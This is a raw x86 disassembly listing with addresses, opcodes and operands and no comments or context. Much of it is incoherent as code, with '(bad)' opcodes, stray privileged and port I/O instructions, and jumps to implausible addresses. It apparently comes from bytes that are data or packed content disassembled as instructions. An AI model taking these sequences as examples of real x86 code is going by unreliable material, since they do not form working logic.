  445b81:	add    BYTE PTR [edi-0x9],ch
  445b84:	add    al,0x40
  445b86:	jmp    0x445b8b
	...
  445b9f:	add    cl,al
  445ba1:	and    ebx,DWORD PTR [edi+0x1e]
  445ba4:	rcr    BYTE PTR ds:0x91376c57,cl
  445baa:	cmp    ah,BYTE PTR [edx-0x44]
  445bad:	add    esp,DWORD PTR ds:0xe7b5a72f
  445bb3:	pop    ecx
  445bb4:	rcr    BYTE PTR ds:0x86a890f9,cl
  445bba:	shl    BYTE PTR [ebp+0x4e],0x80
  445bbe:	inc    eax
  445bbf:	or     eax,0xd6192cb7
  445bc4:	enter  0xdf99,0xe8
  445bc8:	mov    al,0xc7
  445bca:	sti    
  445bcb:	iret   
  445bcc:	and    DWORD PTR [esi],ebx
  445bce:	stc    
  445bcf:	rcl    BYTE PTR [eax-0x80],cl
  445bd2:	inc    ebx
  445bd3:	int    0xbd
  445bd5:	add    al,0x85
  445bd7:	jmp    0xe47f9e20
  445bdc:	test   DWORD PTR [eax+eax*8],0x855b83f6
  445be3:	test   al,0xb5
  445be5:	and    DWORD PTR [ebx-0x7f],0x8ffbc7b1
  445bec:	loope  0x445c0b
  445bee:	stc    
  445bef:	mov    edx,0xe9762cb7
  445bf4:	test   DWORD PTR [edi*4+0x7e72c62],0xfe6b462
  445bff:	repnz das 
  445c01:	or     BYTE PTR [ebp+eax*1+0x0],0x0
	...
  445c1a:	add    BYTE PTR [eax],al
  445c1c:	add    ah,dh
  445c1e:	xchg   ebp,eax
  445c1f:	push   es
  445c20:	bound  ebp,QWORD PTR [esi+eiz*8+0x5b175603]
  445c27:	adc    BYTE PTR [eax],al
  445c29:	fnsave ds:0xc946e1f0
  445c2f:	add    BYTE PTR [ecx+ebp*8+0x18],0xf0
  445c34:	fs stc 
  445c36:	cld    
  445c37:	cli    
  445c38:	xlat   BYTE PTR ds:[ebx]
  445c39:	es dec ebp
  445c3b:	sbb    eax,0xfae60a08
  445c40:	shl    BYTE PTR [esi-0x3c],cl
  445c43:	(bad)  
  445c45:	jne    0x445c12
  445c47:	push   0x43
  445c49:	popf   
  445c4a:	(bad)  
  445c4b:	clc    
  445c4c:	xor    eax,0x68d
  445c51:	push   ss
  445c52:	dec    ebp
  445c53:	sbb    eax,0x1d64d410
  445c58:	adc    al,ah
  445c5a:	jns    0x445c79
  445c5c:	adc    BYTE PTR [esi],al
  445c5e:	loope  0x445caa
  445c60:	push   esi
  445c61:	sbb    ah,BYTE PTR [esi+0x11ec043]
  445c67:	sub    DWORD PTR [ebp+0x31],eax
  445c6a:	adc    eax,0x62c450be
  445c6f:	loope  0x445c70
  445c71:	clc    
  445c72:	call   0xc1a5a1f9
  445c77:	cmp    al,0xfc
  445c79:	push   ebx
  445c7a:	jmp    0x42e95c75
  445c7f:	icebp  
  445c80:	lea    eax,[eax]
	...
  445c9a:	enter  0x63d0,0xa3
  445c9e:	sbb    eax,0x5e000006
  445ca3:	popf   
  445ca4:	inc    esp
  445ca5:	lock stc 
  445ca7:	popf   
  445ca8:	add    al,0x0
  445caa:	or     eax,0x2590006
  445caf:	dec    eax
  445cb0:	push   edi
  445cb1:	pop    ebx
  445cb2:	data16 jecxz 0x445d09
  445cb5:	push   ecx
  445cb6:	push   cs
  445cb7:	popf   
  445cb8:	not    BYTE PTR [ebp-0xc]
  445cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445cbc:	sbb    cl,bh
  445cbe:	dec    ecx
  445cbf:	adc    BYTE PTR [ebx+esi*2],ch
  445cc2:	in     al,0xc2
  445cc4:	mov    cl,0xb
  445cc6:	ret    
  445cc7:	push   eax
  445cc8:	cmc    
  445cc9:	addr16 mov ah,0x44
  445ccc:	sar    bh,0x1b
  445ccf:	pusha  
  445cd0:	cmp    eax,0xaff3f43d
  445cd5:	cmc    
  445cd6:	mov    ds:0xfcc47ffa,eax
  445cdb:	push   eax
  445cdc:	inc    eax
  445cdd:	stc    
  445cde:	fpatan 
  445ce0:	or     eax,0x3e96f440
  445ce5:	mov    ebp,0xfffd2b64
  445cea:	hlt    
  445ceb:	jle    0x445cc0
  445ced:	test   BYTE PTR [eax+0x3405053f],bh
  445cf3:	mov    eax,0xffb0850b
  445cf8:	jne    0x2d5864ae
	...
  445d16:	add    BYTE PTR [esi],ah
  445d18:	xor    dh,BYTE PTR [ebx]
  445d1a:	test   DWORD PTR [esi+edx*4],ebp
  445d1d:	mov    edi,0x3352f023
  445d22:	test   DWORD PTR [edi],esp
  445d24:	inc    esi
  445d25:	ret    
  445d26:	test   BYTE PTR [esi+eiz*4],bh
  445d29:	(bad)  
  445d2a:	and    eax,DWORD PTR [eax]
  445d2c:	xchg   edi,eax
  445d2d:	iret   
  445d2e:	and    eax,DWORD PTR [edi+edx*4]
  445d31:	mov    edi,0x1b5ce823
  445d36:	iret   
  445d37:	das    
  445d38:	pop    esp
  445d39:	sbb    cl,bh
  445d3b:	sub    al,0x16
  445d3d:	cmp    al,0x73
  445d3f:	or     BYTE PTR [edx-0x65fb7ad0],dl
  445d45:	lahf   
  445d46:	and    ecx,DWORD PTR [ebx+eiz*4]
  445d49:	cmp    eax,DWORD PTR [ebp+0x100b0530]
  445d4f:	in     eax,0x1f
  445d51:	out    0x54,al
  445d53:	dec    edx
  445d54:	pop    es
  445d55:	push   cs
  445d56:	rcl    BYTE PTR [edi],1
  445d58:	cmc    
  445d59:	sar    ebx,1
  445d5b:	pop    ecx
  445d5c:	add    dh,bh
  445d5e:	mov    edi,0x4b10917
  445d63:	cs aam 0x14
  445d66:	jg     0x445d1e
  445d68:	mov    bh,0x8d
  445d6a:	inc    ebp
  445d6b:	add    al,0x5
  445d6d:	(bad)  
  445d6e:	aas    
  445d6f:	sub    ah,al
  445d71:	out    0x9f,al
  445d73:	jp     0x445d7a
  445d75:	out    0x3,eax
  445d77:	hlt    
  445d78:	mov    ah,0x5d
  445d7a:	rol    BYTE PTR [eax],0x0
	...
  445d91:	add    BYTE PTR [eax],al
  445d93:	add    bh,dl
  445d95:	hlt    
  445d96:	outs   dx,DWORD PTR ds:[esi]
  445d97:	cwde   
  445d98:	xlat   BYTE PTR ds:[ebx]
  445d99:	hlt    
  445d9a:	imul   ebx,DWORD PTR [eax+0x23bdf4d7],0xffffffc1
  445da1:	scas   al,BYTE PTR es:[edi]
  445da2:	xchg   ecx,eax
  445da3:	jle    0x445d5c
  445da5:	sbb    al,0x70
  445da7:	mov    al,ds:0xc06db55b
  445dac:	pop    edi
  445dad:	inc    eax
  445dae:	sub    al,0x28
  445db0:	dec    ebp
  445db1:	sbb    dl,cl
  445db3:	sub    dh,BYTE PTR [ebx-0x3e]
  445db6:	mov    esi,0x4314b778
  445dbb:	addr16 hlt 
  445dbd:	add    al,0xe7
  445dbf:	add    esi,DWORD PTR [ecx-0x74]
  445dc2:	sbb    al,0x34
  445dc4:	nop
  445dc5:	(bad)  
  445dc6:	hlt    
  445dc7:	add    esi,esp
  445dc9:	add    al,0xe7
  445dcb:	int3   
  445dcc:	mov    esp,0xc33d2db6
  445dd1:	inc    ebx
  445dd2:	mov    ah,al
  445dd4:	mov    ebp,esi
  445dd6:	es add al,0x30
  445dd9:	dec    ecx
  445dda:	stos   DWORD PTR es:[edi],eax
  445ddb:	aaa    
  445ddc:	sub    BYTE PTR [ecx+0x0],cl
  445ddf:	ja     0x445dff
  445de1:	push   ds
  445de2:	stc    
  445de3:	jmp    0x414462df
  445de8:	push   cs
  445de9:	push   ds
  445dea:	stc    
  445deb:	jmp    0x574462e7
  445df0:	push   ds
  445df1:	push   ds
  445df2:	stc    
  445df3:	add    eax,DWORD PTR [ebx+0x6ffd8]
	...
  445e11:	mov    ebx,eax
  445e13:	(bad)  
  445e14:	call   0x36446310
  445e19:	ficomp WORD PTR ds:0xd99f5bf9
  445e1f:	(bad)  
  445e20:	jle    0x445db1
  445e22:	fcos   
  445e24:	call   0x16446320
  445e29:	ficomp WORD PTR ds:0xd80acaf9
  445e2f:	dec    ebp
  445e31:	add    bl,al
  445e33:	(bad)  
  445e34:	call   0xf6446330
  445e39:	sbb    eax,0xe91bf91e
  445e3e:	xlat   BYTE PTR ds:[ebx]
  445e3f:	(bad)  
  445e40:	mov    esi,0xe8ffd7e2
  445e45:	test   DWORD PTR [eax+eax*1],0xf91e1dd6
  445e4c:	ja     0x445e18
  445e4e:	xlat   BYTE PTR ds:[ebx]
  445e4f:	jmp    DWORD PTR [edx-0x3e]
  445e52:	xlat   BYTE PTR ds:[ebx]
  445e53:	(bad)  
  445e54:	call   0xb6446350
  445e59:	fstp   QWORD PTR ds:0xd7af76f9
  445e5f:	jmp    DWORD PTR [ecx-0x61]
  445e62:	xlat   BYTE PTR ds:[ebx]
  445e63:	(bad)  
  445e64:	call   0x96446360
  445e69:	fstp   QWORD PTR ds:0xd78f00f9
  445e6f:	(bad)  
  445e70:	(bad)  
  445e71:	call   0x449711
	...
  445e8e:	or     eax,0x6a000003
  445e93:	in     al,dx
  445e94:	idiv   bh
  445e96:	test   al,0x9b
  445e98:	cmp    BYTE PTR [eax],al
  445e9a:	cld    
  445e9b:	cdq    
  445e9c:	cmp    BYTE PTR [eax],al
  445e9e:	int    0x2
  445ea0:	add    BYTE PTR [eax],al
  445ea2:	sub    ch,ah
  445ea4:	idiv   bh
  445ea6:	and    BYTE PTR [ecx-0x66cbffc8],bl
  445eac:	cmp    BYTE PTR [eax],al
  445eae:	int    0x2
  445eb0:	add    BYTE PTR [eax],al
  445eb2:	jmp    0x3fb2:0xe0fff6eb
  445eb9:	add    ah,dl
  445ebb:	mov    dl,0x3f
  445ebd:	add    BYTE PTR [ebp-0x15fffffe],cl
  445ec3:	jmp    0x445ebb
  445ec5:	jmp    DWORD PTR [esp+esi*4+0x3f]
  445ec9:	add    BYTE PTR [eax-0x4c],bh
  445ecc:	aas    
  445ecd:	add    BYTE PTR [ebp+0x6a000002],cl
  445ed3:	in     eax,dx
  445ed4:	idiv   bh
  445ed6:	test   eax,0xfd003fc7
  445edb:	lds    edi,FWORD PTR [edi]
  445edd:	add    BYTE PTR [ebp+0x2],cl
  445ee0:	add    BYTE PTR [eax],al
  445ee2:	sub    ch,ch
  445ee4:	idiv   bh
  445ee6:	add    al,0xb5
  445ee8:	aas    
  445ee9:	add    BYTE PTR [eax],bl
  445eeb:	mov    ch,0x3f
  445eed:	add    BYTE PTR [ebp+0x2],cl
	...
  445f08:	add    BYTE PTR [eax],al
  445f0a:	add    BYTE PTR [edx-0x13],ch
  445f0d:	idiv   bh
  445f0f:	jnp    0x445ebc
  445f11:	aas    
  445f12:	add    BYTE PTR [edi-0x55],ch
  445f15:	aas    
  445f16:	add    BYTE PTR ds:0xf4000002,cl
  445f1c:	outs   dx,BYTE PTR ds:[esi]
  445f1d:	sub    cl,bh
  445f1f:	or     edx,DWORD PTR [ebx+0x4a]
  445f22:	inc    eax
  445f23:	hlt    
  445f24:	pop    esi
  445f25:	dec    edx
  445f26:	inc    eax
  445f27:	hlt    
  445f28:	sub    edi,ebp
  445f2a:	push   esp
  445f2c:	mov    fs,WORD PTR [edi]
  445f2e:	stc    
  445f2f:	jmp    0x445f04
  445f31:	je     0x445f72
  445f33:	hlt    
  445f34:	pop    edi
  445f35:	jne    0x445f76
  445f37:	hlt    
  445f38:	sub    edi,ebp
  445f3a:	push   esp
  445f3c:	scas   al,BYTE PTR es:[edi]
  445f3d:	daa    
  445f3e:	stc    
  445f3f:	retf   
  445f40:	mov    eax,ds:0x8df44036
  445f45:	ss inc eax
  445f47:	hlt    
  445f48:	sub    edi,ebp
  445f4a:	push   esp
  445f4c:	into   
  445f4d:	daa    
  445f4e:	stc    
  445f4f:	stos   DWORD PTR es:[edi],eax
  445f50:	daa    
  445f51:	xor    al,BYTE PTR [eax-0xc]
  445f54:	imul   esi,DWORD PTR [edx],0x40
  445f57:	hlt    
  445f58:	sub    edi,ebp
  445f5a:	push   esp
  445f5c:	pop    eax
  445f5d:	test   ah,ch
  445f5f:	shl    DWORD PTR [ecx+ebx*1+0x1576264f],cl
  445f66:	and    ah,0x2b
  445f69:	std    
  445f6a:	pop    edi
  445f6b:	add    eax,0x5bfd2c
	...
  445f88:	add    eax,0x557fd2c
  445f8d:	sub    al,0xfd
  445f8f:	push   ebx
  445f90:	add    eax,0xe563fd2c
  445f95:	sub    edi,ebp
  445f97:	fwait
  445f98:	in     eax,0x2b
  445f9a:	std    
  445f9b:	xchg   ebp,esp
  445f9d:	sub    edi,ebp
  445f9f:	and    ebp,0x2b
  445fa2:	std    
  445fa3:	aas    
  445fa4:	add    eax,0x53bfd2c
  445fa9:	sub    al,0xfd
  445fab:	aaa    
  445fac:	add    eax,0xe003e705
  445fb1:	repz out 0x3,al
  445fb4:	mov    eax,0x8803e6f3
  445fb9:	repz out 0x3,al
  445fbc:	mov    ebx,?
  445fbe:	out    0x3,al
  445fc0:	ret    
  445fc1:	cli    
  445fc2:	out    0x3,al
  445fc4:	adc    al,0xf6
  445fc6:	out    0x3,al
  445fc8:	or     dh,dh
  445fca:	out    0x3,al
  445fcc:	cld    
  445fcd:	cmc    
  445fce:	out    0x3,al
  445fd0:	add    dh,dh
  445fd2:	out    0x3,al
  445fd4:	sbb    dh,dh
  445fd6:	out    0x3,al
  445fd8:	sub    dh,dh
  445fda:	out    0x3,al
  445fdc:	sub    al,0xf6
  445fde:	out    0x3,al
  445fe0:	xor    dh,dh
  445fe2:	out    0x3,al
  445fe4:	hlt    
  445fe5:	cmc    
  445fe6:	out    0x3,al
  445fe8:	test   al,0xf5
  445fea:	out    0x3,al
	...
  446004:	add    BYTE PTR [ebp+esi*8-0xa5ffc1a],bl
  44600b:	out    0x3,al
  44600d:	clc    
  44600e:	cmc    
  44600f:	out    0x3,al
  446011:	enter  0xe6f5,0x3
  446015:	int3   
  446016:	cmc    
  446017:	out    0x3,al
  446019:	shl    ch,1
  44601b:	out    0x3,al
  44601d:	push   esp
  44601e:	cmc    
  44601f:	out    0x3,al
  446021:	dec    eax
  446022:	cmc    
  446023:	out    0x3,al
  446025:	cmp    al,0xf5
  446027:	out    0x3,al
  446029:	inc    eax
  44602a:	cmc    
  44602b:	out    0x3,al
  44602d:	pop    eax
  44602e:	cmc    
  44602f:	out    0x3,al
  446031:	call   0x9648472b
  446036:	mul    dh
  446038:	add    esi,eax
  44603a:	cmc    
  44603b:	out    0x3,al
  44603d:	xor    al,0xf5
  44603f:	(bad)  
  446040:	call   0xe954b13c
  446045:	test   DWORD PTR [eax+edx*1-0x17],0xe91058f7
  44604d:	test   DWORD PTR [eax+0x10],0x1010f7e9
  446054:	jmp    0xe953e750
  446059:	imul   DWORD PTR [eax]
  44605b:	adc    cl,ch
  44605d:	mul    DWORD PTR [eax+edx*1-0x17]
  446061:	div    DWORD PTR [eax+0x10]
  446064:	jmp    0xe954cd60
	...
  446081:	add    bh,dh
  446083:	js     0x446095
  446085:	jmp    0xe954c981
  44608a:	div    DWORD PTR [eax]
  44608c:	adc    cl,ch
  44608e:	mul    DWORD PTR [esi+0x48f7e90e]
  446094:	adc    cl,ch
  446096:	test   DWORD PTR [eax+edx*1+0xf90f7e9],0xf8cf7e9
  4460a1:	jmp    0xe953f99d
  4460a6:	test   DWORD PTR [eax+0x50f7e910],0xc6f7e910
  4460b0:	push   cs
  4460b1:	jmp    0xe954c9ad
  4460b6:	div    esp
  4460b8:	push   cs
  4460b9:	jmp    0xe95361b5
  4460be:	idiv   esp
  4460c0:	push   cs
  4460c1:	jmp    0xe95369bd
  4460c6:	test   DWORD PTR [edi+ecx*1],0x1010f7e9
  4460cd:	jmp    0x546dc9
  4460d2:	dec    ebp
  4460d3:	pop    es
  4460d4:	hlt    
  4460d5:	adc    BYTE PTR ds:0x1d10c407,bl
  4460db:	pop    es
  4460dc:	rcl    BYTE PTR [eax],0xd
  4460df:	pop    es
  4460e0:	mov    esp,0xb8070d10
  4460e5:	adc    BYTE PTR [eax],al
	...
  4460ff:	sbb    eax,0x1d10b407
  446104:	pop    es
  446105:	mov    al,0x10
  446107:	or     eax,0xd10ac07
  44610c:	pop    es
  44610d:	test   al,0x10
  44610f:	fld    QWORD PTR [esi]
  446111:	xor    BYTE PTR [eax],dl
  446113:	fld    QWORD PTR [esi]
  446115:	sub    al,0x10
  446117:	int    0x6
  446119:	sub    BYTE PTR [eax],dl
  44611b:	int    0x6
  44611d:	and    al,0x10
  44611f:	fld    QWORD PTR [esi]
  446121:	and    BYTE PTR [eax],dl
  446123:	fld    QWORD PTR [esi]
  446125:	sbb    al,0x10
  446127:	int    0x6
  446129:	sbb    BYTE PTR [eax],dl
  44612b:	int    0x6
  44612d:	adc    al,0x10
  44612f:	popf   
  446130:	push   es
  446131:	adc    BYTE PTR [eax],dl
  446133:	popf   
  446134:	push   es
  446135:	or     al,0x10
  446137:	lea    eax,[esi]
  446139:	or     BYTE PTR [eax],dl
  44613b:	lea    eax,[esi]
  44613d:	add    al,0x10
  44613f:	popf   
  446140:	push   es
  446141:	add    BYTE PTR [eax],dl
  446143:	popf   
  446144:	push   es
  446145:	cld    
  446146:	jge    0x8d545952
  44614c:	push   es
  44614d:	hlt    
  44614e:	minps  xmm0,XMMWORD PTR [esi]
  446151:	lock minps xmm0,XMMWORD PTR [esi]
  446155:	in     al,dx
  446156:	cmovge eax,DWORD PTR [esi]
  446159:	push   es
  44615a:	adc    DWORD PTR [ebp+0x6],ecx
  44615d:	aam    0xf
  44615f:	pop    ebp
  446160:	push   es
  446161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446162:	adc    BYTE PTR [eax],al
	...
  44617c:	hlt    
  44617d:	sbb    edi,ebp
  44617f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446180:	in     al,0x1b
  446182:	std    
  446183:	mov    eax,0xebfd1be3
  446188:	or     ebx,DWORD PTR [edi*8-0x2e3fa02]
  44618f:	mov    ds:0xcbfd1c05,eax
  446194:	jmp    0x4461b1
  446196:	std    
  446197:	sub    ah,ah
  446199:	sbb    edi,ebp
  44619b:	mov    edi,0xbbfd1bfb
  4461a0:	repz sbb edi,ebp
  4461a3:	mov    bh,0xeb
  4461a5:	sbb    edi,ebp
  4461a7:	mov    bl,0x3
  4461a9:	sbb    al,0xfd
  4461ab:	mov    bl,0xfb
  4461ad:	sbb    edi,ebp
  4461af:	scas   eax,DWORD PTR es:[edi]
  4461b0:	repz sbb edi,ebp
  4461b3:	stos   DWORD PTR es:[edi],eax
  4461b4:	jmp    0x4461d1
  4461b6:	std    
  4461b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4461b8:	add    ebx,DWORD PTR [edi*8-0x2e4045d]
  4461bf:	lahf   
  4461c0:	repz sbb edi,ebp
  4461c3:	fwait
  4461c4:	jmp    0x4461e1
  4461c6:	std    
  4461c7:	xchg   edi,eax
  4461c8:	add    ebx,DWORD PTR [edi*8-0x2e4046d]
  4461cf:	(bad)  
  4461d0:	repz sbb edi,ebp
  4461d3:	mov    ebp,ebx
  4461d5:	sbb    edi,ebp
  4461d7:	xchg   DWORD PTR [ebx],eax
  4461d9:	sbb    al,0xfd
  4461db:	cmp    ebx,0x1b
  4461de:	std    
  4461df:	jg     0x4461e1
	...
  4461f9:	repz sbb edi,ebp
  4461fc:	jnp    0x4461e9
  4461fe:	sbb    edi,ebp
  446200:	ja     0x446205
  446202:	sbb    al,0xfd
  446204:	aam    0xfb
  446206:	sbb    edi,ebp
  446208:	loope  0x44620f
  44620a:	sbb    al,0xfd
  44620c:	retf   
  44620d:	add    eax,0x3d03e705
  446212:	add    edi,esp
  446214:	add    esp,DWORD PTR [ecx+eax*1+0x1b003e7]
  44621b:	out    0x3,eax
  44621d:	lods   al,BYTE PTR ds:[esi]
  44621e:	add    edi,esp
  446220:	add    edi,DWORD PTR [eax-0x4bfc18ff]
  446226:	add    edi,esp
  446228:	add    esp,eax
  44622a:	add    edi,esp
  44622c:	add    ebx,esp
  44622e:	add    edi,esp
  446230:	add    ecx,eax
  446232:	add    edi,esp
  446234:	add    eax,esp
  446236:	add    edi,esp
  446238:	add    edx,eax
  44623a:	add    edi,esp
  44623c:	add    ecx,esp
  44623e:	add    edi,esp
  446240:	add    edi,DWORD PTR [esi]
  446242:	mul    dh
  446244:	add    esp,DWORD PTR [eax+eax*1]
  446247:	out    0x3,eax
  446249:	adc    BYTE PTR [eax],al
  44624b:	out    0x3,eax
  44624d:	or     al,0x0
  44624f:	out    0x3,eax
  446251:	sbb    BYTE PTR [eax],al
  446253:	out    0x3,eax
  446255:	adc    al,0x0
  446257:	out    0x3,eax
  446259:	loopne 0x44625a
  44625b:	out    0x3,al
	...
  446275:	add    ah,bl
  446277:	jmp    esi
  446279:	add    ecx,DWORD PTR [eax]
  44627b:	add    bh,ah
  44627d:	add    eax,DWORD PTR [eax+eax*1]
  446280:	out    0x3,eax
  446282:	lock jmp esi
  446285:	add    ebx,DWORD PTR [ecx-0xb]
  446288:	out    0x3,al
  44628a:	clc    
  44628b:	jmp    esi
  44628d:	add    esi,esp
  44628f:	jmp    esi
  446291:	add    eax,DWORD PTR [eax+0x7c03e6ff]
  446297:	jmp    esi
  446299:	add    ebp,DWORD PTR [eax-0x1]
  44629c:	out    0x3,al
  44629e:	mov    al,0xf4
  4462a0:	(bad)  
  4462a1:	call   0xe954179d
  4462a6:	not    eax
  4462a8:	psubsw mm6,mm7
  4462ab:	mov    esp,0x24f7e90f
  4462b0:	or     ch,cl
  4462b2:	div    DWORD PTR [eax]
  4462b4:	or     ch,cl
  4462b6:	imul   DWORD PTR [edx+ecx*1]
  4462b9:	jmp    0xe94e9bb5
  4462be:	idiv   DWORD PTR [eax]
  4462c0:	or     ch,cl
  4462c2:	test   DWORD PTR [eax],0x3cf7e909
  4462c8:	or     ch,cl
  4462ca:	test   DWORD PTR [eax+0xa],0xa44f7e9
  4462d1:	jmp    0xe94eb3cd
  4462d6:	test   DWORD PTR [edx+ecx*1-0x17],0x0
	...
  4462f2:	add    bh,dh
  4462f4:	pop    eax
  4462f5:	or     ch,cl
  4462f7:	neg    DWORD PTR [eax+0xa]
  4462fa:	jmp    0xe94eb7f6
  4462ff:	mul    DWORD PTR [eax+0xa]
  446302:	jmp    0xe94ebffe
  446307:	imul   DWORD PTR [eax+0xa]
  44630a:	jmp    0xe94ec806
  44630f:	div    DWORD PTR [eax+0xa]
  446312:	jmp    0xe94ed00e
  446317:	mul    DWORD PTR [edx+ecx*1]
  44631a:	jmp    0xe94e9416
  44631f:	imul   DWORD PTR [edx+ecx*1]
  446322:	jmp    0xe94e9c1e
  446327:	div    DWORD PTR [edx+ecx*1]
  44632a:	jmp    0xe94ea426
  44632f:	idiv   DWORD PTR [edx+ecx*1]
  446332:	add    BYTE PTR [ebp+0x3],bl
  446335:	les    ecx,FWORD PTR [esi]
  446337:	pop    ebp
  446338:	add    edx,ebx
  44633a:	push   cs
  44633b:	dec    ebp
  44633c:	add    ecx,edi
  44633e:	push   cs
  44633f:	dec    ebp
  446340:	add    ebp,DWORD PTR [edi+0x64035d0f]
  446346:	push   cs
  446347:	pop    ebp
  446348:	add    edi,DWORD PTR [esi+0xf]
  44634b:	dec    ebp
  44634c:	add    edi,DWORD PTR [edx+0xf]
  44634f:	dec    ebp
  446350:	add    edi,DWORD PTR [ebx+0x3d031d0e]
  446356:	sldt   WORD PTR [eax]
	...
  44636d:	add    BYTE PTR [eax],al
  44636f:	add    BYTE PTR ds:0xd0f6c03,bl
  446375:	add    ecx,DWORD PTR [esi+ecx*1+0xd]
  446379:	add    ecx,DWORD PTR [edi+0x44031d0f]
  44637f:	push   cs
  446380:	sbb    eax,0xd0e4003
  446385:	add    eax,DWORD PTR [eax+0xe]
  446388:	or     eax,0xdd0e6803
  44638d:	add    dh,BYTE PTR [esi+ecx*1]
  446390:	fld    QWORD PTR [edx]
  446392:	and    BYTE PTR [esi],cl
  446394:	int    0x2
  446396:	sbb    al,0xe
  446398:	int    0x2
  44639a:	sbb    BYTE PTR [esi],cl
  44639c:	fld    QWORD PTR [edx]
  44639e:	adc    al,0xe
  4463a0:	fld    QWORD PTR [edx]
  4463a2:	and    ecx,DWORD PTR [edi]
  4463a4:	int    0x2
  4463a6:	pop    ds
  4463a7:	bswap  ebp
  4463a9:	add    bl,BYTE PTR [eax]
  4463ab:	push   cs
  4463ac:	popf   
  4463ad:	add    dl,BYTE PTR [esi+ecx*1]
  4463b0:	popf   
  4463b1:	add    al,BYTE PTR [edx-0x43fd72e9]
  4463b7:	pop    ss
  4463b8:	lea    eax,[edx]
  4463ba:	dec    ecx
  4463bb:	sbb    BYTE PTR [ebp-0x62e758fe],bl
  4463c1:	add    ah,BYTE PTR [edx]
  4463c3:	sbb    esp,esi
  4463c5:	sbb    edi,ebp
  4463c7:	ja     0x4463a6
  4463c9:	sbb    edi,ebp
  4463cb:	(bad)  ds:0xe2efd1c
  4463d1:	sbb    al,0xfd
  4463d3:	repz add BYTE PTR [eax],al
	...
  4463ea:	add    BYTE PTR [eax],al
  4463ec:	add    cl,dh
  4463ee:	sbb    edi,ebp
  4463f0:	out    dx,eax
  4463f1:	jmp    0x2306111
  4463f6:	sbb    al,0xfd
  4463f8:	out    0xf9,eax
  4463fa:	sbb    edi,ebp
  4463fc:	jecxz  0x4463ef
  4463fe:	sbb    edi,ebp
  446400:	fucomip st,st(1)
  446402:	sbb    edi,ebp
  446404:	fild   DWORD PTR [ecx]
  446406:	sbb    al,0xfd
  446408:	xlat   BYTE PTR ds:[ebx]
  446409:	stc    
  44640a:	sbb    edi,ebp
  44640c:	pslld  mm3,QWORD PTR [ebx]
  44640f:	std    
  446410:	or     ebp,edx
  446412:	sbb    edi,ebp
  446414:	rol    DWORD PTR [ebx],0x1c
  446417:	std    
  446418:	(bad)  
  446419:	stc    
  44641a:	sbb    edi,ebp
  44641c:	mov    edi,0xbbfd1bf1
  446421:	jmp    0x1fc6141
  446426:	sbb    al,0xfd
  446428:	mov    bl,0xf9
  44642a:	sbb    edi,ebp
  44642c:	jns    0x446420
  44642e:	sbb    edi,ebp
  446430:	stos   DWORD PTR es:[edi],eax
  446431:	jmp    0xea316151
  446436:	sbb    edi,ebp
  446438:	xor    edx,esp
  44643a:	sbb    edi,ebp
  44643c:	lahf   
  44643d:	icebp  
  44643e:	sbb    edi,ebp
  446440:	fwait
  446441:	jmp    0x4706161
  446446:	sbb    al,0xfd
  446448:	push   ebp
  446449:	add    al,0x1c
  44644b:	std    
  44644c:	(bad)  
  44644d:	icebp  
  44644e:	sbb    edi,ebp
  446450:	mov    eax,DWORD PTR [eax]
	...
  44646a:	jmp    0x1cc618a
  44646f:	add    eax,0xff7003e7
  446474:	out    0x3,al
  446476:	je     0x446477
  446478:	out    0x3,al
  44647a:	clc    
  44647b:	jmp    esi
  44647d:	add    ebx,DWORD PTR [esp+esi*8-0xbc8fc1a]
  446484:	out    0x3,al
  446486:	inc    edx
  446487:	hlt    
  446488:	out    0x3,al
  44648a:	pop    ebp
  44648b:	hlt    
  44648c:	out    0x3,al
  44648e:	lods   al,BYTE PTR ds:[esi]
  44648f:	jmp    esi
  446491:	add    esp,DWORD PTR [eax+0x7e03e6ff]
  446497:	std    
  446498:	out    0x3,al
  44649a:	cwde   
  44649b:	jmp    esi
  44649d:	add    ecx,esp
  44649f:	jmp    esi
  4464a1:	add    eax,eax
  4464a3:	jmp    esi
  4464a5:	add    eax,esp
  4464a7:	jmp    esi
  4464a9:	add    ebp,DWORD PTR [eax+0x5603e6ff]
  4464af:	std    
  4464b0:	out    0x3,al
  4464b2:	mov    al,0xff
  4464b4:	out    0x3,al
  4464b6:	pop    esi
  4464b7:	std    
  4464b8:	out    0x3,al
  4464ba:	enter  0xe6ff,0x3
  4464be:	sub    al,0xfa
  4464c0:	out    0x3,al
  4464c2:	jp     0x4464c0
  4464c4:	out    0x3,al
  4464c6:	adc    al,0xfa
  4464c8:	out    0x3,al
  4464ca:	clc    
  4464cb:	stc    
  4464cc:	out    0x3,al
	...
  4464e6:	add    ah,ch
  4464e8:	stc    
  4464e9:	out    0x3,al
  4464eb:	loopne 0x4464e6
  4464ed:	out    0x3,al
  4464ef:	in     al,0xf9
  4464f1:	out    0x3,al
  4464f3:	call   0xfc484bf1
  4464f8:	stc    
  4464f9:	out    0x3,al
  4464fb:	lock stc 
  4464fd:	out    0x3,al
  4464ff:	ja     0x4464f2
  446501:	(bad)  
  446502:	call   0xe9506dfe
  446507:	test   DWORD PTR [esp+ecx*1],0xc10f7e9
  44650e:	jmp    0xe9507a0a
  446513:	neg    DWORD PTR [eax]
  446515:	or     al,0xe9
  446517:	neg    DWORD PTR [esp+ecx*1]
  44651a:	jmp    0xe9508616
  44651f:	neg    esp
  446521:	or     ecx,ebp
  446523:	mul    eax
  446525:	or     ecx,ebp
  446527:	mul    esp
  446529:	or     ecx,ebp
  44652b:	imul   eax
  44652d:	or     ecx,ebp
  44652f:	test   esi,0xd2f7e908
  446535:	or     cl,ch
  446537:	not    esi
  446539:	or     cl,ch
  44653b:	neg    edx
  44653d:	or     cl,ch
  44653f:	test   DWORD PTR [esp+ecx*1-0x17],0xe90c48f7
  446547:	test   DWORD PTR [esp+ecx*1-0x17],0x0
	...
  446563:	add    bh,dh
  446565:	push   eax
  446566:	or     al,0xe9
  446568:	not    DWORD PTR [esp+ecx*1-0x17]
  44656c:	neg    DWORD PTR [eax+0xc]
  44656f:	jmp    0xe950c26b
  446574:	mul    DWORD PTR [eax+0xc]
  446577:	jmp    0xe950ba73
  44657c:	neg    DWORD PTR [eax+0xc]
  44657f:	jmp    0xe950c27b
  446584:	mul    DWORD PTR [eax+0xc]
  446587:	jmp    0xe950ca83
  44658c:	imul   DWORD PTR [eax+0xc]
  44658f:	jmp    0x4e7c8b
